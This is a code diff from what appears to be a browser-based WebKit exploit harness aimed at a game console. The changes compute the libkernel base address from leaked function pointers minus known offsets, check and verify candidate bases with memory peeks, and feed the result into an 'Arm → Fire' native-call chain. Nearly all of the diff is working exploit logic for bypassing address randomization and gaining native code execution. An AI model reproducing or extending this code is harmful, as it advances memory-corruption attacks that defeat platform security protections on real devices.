@@ -46,6 +46,8 @@ import {
     resolveLibkernelRelroChunk,
     verifyLibkernelBase,
     verifyLibkernelUsleep1352,
+    calcLkFromFnPtrZeroRead,
+    calcLkBestFromFnPtr,
     extPtrToLkCandidates,
     plausibleHeapCell,
     resolveExtModuleHunt,
@@ -56,7 +58,7 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250832f";
+const BUILD_ID = "rw-20250832g";
 /** BillZaiD fixed lk base (game process) — trial in WebKit via usleep prologue */
 const BILLZAI_LK_BASE = "80a67c000";
 const SS_HUNT_TRACE = "wk-hunt-trace";
@@ -309,33 +311,17 @@ function buildCalLkCandidates(p, off, webkitBase) {
         const c = entries[i];
         const codePtr = parseAddr(c.ptr);
         if (!codePtr) continue;
-        if (p && off && webkitBase) {
-            const bases = extPtrToLkCandidates(p, codePtr, off, webkitBase);
-            for (let b = 0; b < bases.length; b++) {
+        const rvaHits = calcLkFromFnPtrZeroRead(codePtr, off);
+        if (rvaHits.length) {
+            for (let r = 0; r < rvaHits.length && r < 4; r++) {
+                const h = rvaHits[r];
                 push({
-                    label: c.label + " (" + (b === 0 ? "page" : "kerr") + ")",
+                    label: c.label + " −" + h.key,
                     code: c.ptr,
                     magic: c.code,
-                    base: bases[b],
-                    note: b === 0 ? "ext-ptr" : "error-rva",
-                });
-            }
-        } else {
-            const base = lkBaseFromCalEntry(c);
-            if (base) {
-                push({
-                    label: c.label,
-                    code: c.ptr,
-                    magic: c.code,
-                    base,
-                    note: "align4k",
-                });
-                push({
-                    label: c.label + " −4K",
-                    code: c.ptr,
-                    magic: c.code,
-                    base: base.sub32(0x4000),
-                    note: "align4k-4k",
+                    base: h.lk,
+                    note: "fn−0x" + h.rva.toString(16) + " (0 read)",
+                    rvaKey: h.key,
                 });
             }
         }
@@ -346,8 +332,16 @@ function buildCalLkCandidates(p, off, webkitBase) {
 function validateLkBase(lk) {
     if (!lk) return "missing libkernel base";
     if (lk.hi === 0) return "base hi=0 — need full 64-bit ptr";
+    const off = loadEffectiveOff();
+    const tag = off && off.lk_base_tag != null ? (off.lk_base_tag & 0xfff) : null;
+    if (tag != null) {
+        if (((lk.low >>> 0) & 0xfff) !== tag)
+            return "expected lk …" + tag.toString(16) + " — got low12=0x"
+                + ((lk.low >>> 0) & 0xfff).toString(16);
+        return null;
+    }
     if ((lk.low & 0x3fff) !== 0)
-        return "not 16KB-aligned — Load cal ptr (computes base) or paste module base not code ptr";
+        return "not 16KB-aligned — Calc lk from cal ext ptr (fn−RVA)";
     return null;
 }
 
@@ -548,7 +542,7 @@ const MANUAL_TESTS = [
     { id: "native", group: "base", label: "nativeFn code" },
     { id: "scan-iat", group: "base", label: "Scan libkernel" },
     { id: "leak-lk", group: "base", label: "Leak+vtable LK" },
-    { id: "try-cal-ptrs", group: "base", label: "Load cal ptr" },
+    { id: "try-cal-ptrs", group: "base", label: "Calc lk (0 read)" },
     { id: "verify-lk", group: "base", label: "Verify lk" },
     { id: "show-lk", group: "base", label: "Show LK hints" },
     { id: "try-billzai-lk", group: "base", label: "Try BillZai lk" },
@@ -1980,10 +1974,15 @@ let leakScanState = null;
 
 function runTryCalPtrs() {
     if (!ready || busy) return;
-    const p = window.p;
     const off = loadEffectiveOff();
-    const { webkitBase } = basesFromSession(off);
-    calLkCands = buildCalLkCandidates(p, off, webkitBase);
+    calLkCands = buildCalLkCandidates(null, off, null);
+    if (!calLkCands.length) {
+        mark("LK-CAL-MISS", "no cal ext ptrs — run cal 2e vtable first, or paste ext ptr hex");
+        mark("LK-HINT", "Calc: lk = fnPtr − Suchi RVA (alignment filter, 0 reads)");
+        state("no cal ptrs", "bad");
+        renderOut();
+        return;
+    }
     if (calPtrIdx >= calLkCands.length) {
         calPtrIdx = 0;
         mark("LK-CAL-DONE", "cycle reset — tried all " + calLkCands.length + " bases");
@@ -1993,28 +1992,16 @@ function runTryCalPtrs() {
     const c = calLkCands[calPtrIdx++];
     if (lines.length > 32) lines.splice(0, lines.length - 32);
     if (addrIn && c.base) addrIn.value = String(c.base);
-    lkQuiet = true;
     mark("LK-CAL", "build=" + BUILD_ID + " " + calPtrIdx + "/" + calLkCands.length
-        + " " + c.label + " code=" + c.code + " magic=" + c.magic
-        + " → base=" + c.base + " (" + c.note + ")");
-    if (p && c.base) {
-        const v = verifyLibkernelBase(p, c.base, off);
-        if (v.ok && v.strong)
-            mark("LK-CAL-VERIFY", "OK prologue + getpid stub @ +" + v.stubOff.toString(16));
-        else if (v.ok)
-            mark("LK-CAL-VERIFY", "weak — " + (v.warn || "prologue only"));
-        else
-            mark("LK-CAL-VERIFY", "BAD — " + (v.error || "?"));
-    }
-    mark("LK-HINT", "Verify lk or Force lk → Arm → Fire (no peek on code ptrs)");
-    lkQuiet = false;
+        + " " + c.label + " code=" + c.code + " → base=" + c.base + " (" + c.note + ")");
+    mark("LK-HINT", "Force lk (0 read) or Verify lk (2 peek @ lk+13b20) → Arm → Fire");
     if (outEl) {
         outEl.textContent = lines.join("\n");
         outEl.scrollTop = outEl.scrollHeight;
     }
-    state("base " + calPtrIdx + "/" + calLkCands.length + " — Verify or Force lk", "warn");
+    state("calc " + calPtrIdx + "/" + calLkCands.length + " — Force lk or Verify", "warn");
     try {
-        crashLog.append("LK-CAL " + c.label + " base=" + c.base, "LK-CAL");
+        crashLog.append("LK-CAL " + c.label + " base=" + c.base + " " + c.note, "LK-CAL");
         crashLog.flushSync();
     } catch (_) { }
 }
@@ -2050,11 +2037,8 @@ function runVerifyLk() {
     }
 
     try {
-        const passNames = ["mod12", "mod16"];
-        const passPages = [12, 16];
-        const pass = verifyPassIdx % passNames.length;
-        verifyPassIdx++;
-        const isAlignedBase = (ptr.low & 0x3fff) === 0;
+        const isAlignedBase = (ptr.low & 0xfff) === (off.lk_base_tag != null ? (off.lk_base_tag & 0xfff) : 0)
+            || (ptr.low & 0x3fff) === 0;
 
         if (isAlignedBase) {
             const vSuchi = verifyLibkernelUsleep1352(p, ptr, off);
@@ -2076,57 +2060,50 @@ function runVerifyLk() {
                 crashLog.flushSync();
                 return;
             }
-            const vBase = verifyLibkernelBase(p, ptr, off, { webkitBase, off });
-            if (vBase.ok && vBase.strong) {
-                saveLibkernelSession(ptr, null);
-                mark("LK-VERIFY-OK", String(ptr) + " stub+" + vBase.stubOff.toString(16) + " build=" + BUILD_ID);
-                state("lk verified — Arm → Fire", "ok");
-                renderOut();
-                crashLog.append("VERIFY OK " + hex, "LK-VERIFY");
-                crashLog.flushSync();
-                return;
-            }
-            if (vBase.ok) {
-                saveLibkernelSession(ptr, null);
-                mark("LK-VERIFY-WARN", String(ptr) + " " + (vBase.warn || "weak"));
-                state("weak lk — Force lk → Arm → Fire", "warn");
-                renderOut();
-                crashLog.flushSync();
-                return;
-            }
-        } else {
-            mark("LK-EXT-FN", hex + " — " + passNames[pass] + " (not lk — use Hunt lk)");
-        }
-
-        const diag = resolveExtModuleHuntDiag(p, ptr, webkitBase, off, passPages[pass]);
-        const resolved = diag.hit;
-        if (resolved) {
-            saveLibkernelSession(resolved.lk, resolved.iatRva);
-            if (addrIn) addrIn.value = String(resolved.lk);
-            const v = verifyLibkernelBase(p, resolved.lk, off, { fnPtr: ptr, webkitBase, off });
-            const stubLog = resolved.stubs != null ? " stubs=" + resolved.stubs : "";
-            if (v.ok && v.strong) {
-                mark("LK-VERIFY-OK", String(resolved.lk) + " via " + resolved.via + stubLog + " build=" + BUILD_ID);
-                state("lk verified — Arm → Fire", "ok");
-            } else {
-                mark("LK-VERIFY-WARN", String(resolved.lk) + " via " + resolved.via + stubLog);
-                state("weak lk — Force lk → Arm → Fire", "warn");
-            }
-            mark("LK-RESOLVE-OK", hex + " → " + resolved.lk + " via " + resolved.via + stubLog);
+            mark("LK-VERIFY-MISS", String(ptr) + " — usleep peek miss @ +13b20");
+            state("Okage lk miss in WebKit — try Calc lk from cal ext ptr", "bad");
             renderOut();
-            crashLog.append("VERIFY OK " + hex + " → " + resolved.lk, "LK-VERIFY");
             crashLog.flushSync();
             return;
         }
 
-        const hdrNote = diag.hdr ? (" hdr=1 stubs=" + (diag.stubs != null ? diag.stubs : "?"))
-            : (" hdr=0 walked=" + (diag.walked != null ? diag.walked : "?"));
-        mark("LK-RESOLVE-MISS", hex + " pass=" + passNames[pass] + hdrNote);
+        mark("LK-EXT-FN", hex + " — Suchi RVA calc (0 read)");
+
+        const rvaHits = calcLkFromFnPtrZeroRead(ptr, off);
+        for (let ri = 0; ri < rvaHits.length && ri < 4; ri++) {
+            const h = rvaHits[ri];
+            const vRva = verifyLibkernelUsleep1352(p, h.lk, off);
+            if (vRva.ok) {
+                saveLibkernelSession(h.lk, null);
+                if (addrIn) addrIn.value = String(h.lk);
+                mark("LK-VERIFY-OK", String(h.lk) + " via fn−" + h.key
+                    + " (0 calc + 2 peek @ lk+" + h.rva.toString(16) + ")");
+                state(vRva.strong ? "lk verified — Arm → Fire" : "weak — Force lk → Arm → Fire",
+                    vRva.strong ? "ok" : "warn");
+                renderOut();
+                crashLog.append("VERIFY OK RVA " + hex + " → " + h.lk, "LK-VERIFY");
+                crashLog.flushSync();
+                return;
+            }
+        }
+        if (rvaHits.length) {
+            const h0 = rvaHits[0];
+            if (addrIn) addrIn.value = String(h0.lk);
+            mark("LK-VERIFY-WARN", String(h0.lk) + " calc via " + h0.key
+                + " but usleep peek miss — try Force lk anyway");
+            state("calc OK peek miss — Force lk", "warn");
+            renderOut();
+            crashLog.flushSync();
+            return;
+        }
+
+        mark("LK-RESOLVE-MISS", hex + " — no Suchi RVA yields lk …"
+            + (off.lk_base_tag != null ? off.lk_base_tag.toString(16) : "align"));
         cycleExtPtrInHex();
-        mark("LK-HINT", "tap Hunt lk — uses webkitBase, scans 32MB below");
-        state("ext miss — tap Verify for below-wk", "bad");
+        mark("LK-HINT", "Calc lk (0 read) cycles cal ptrs — or paste Okage lk → Verify");
+        state("RVA miss — next cal ptr or Okage lk", "bad");
         renderOut();
-        crashLog.append("VERIFY FAIL " + hex + " " + passNames[pi] + hdrNote, "LK-VERIFY");
+        crashLog.append("VERIFY FAIL RVA " + hex, "LK-VERIFY");
         crashLog.flushSync();
     } catch (err) {
         mark("LK-VERIFY-ERR", err.message || String(err));
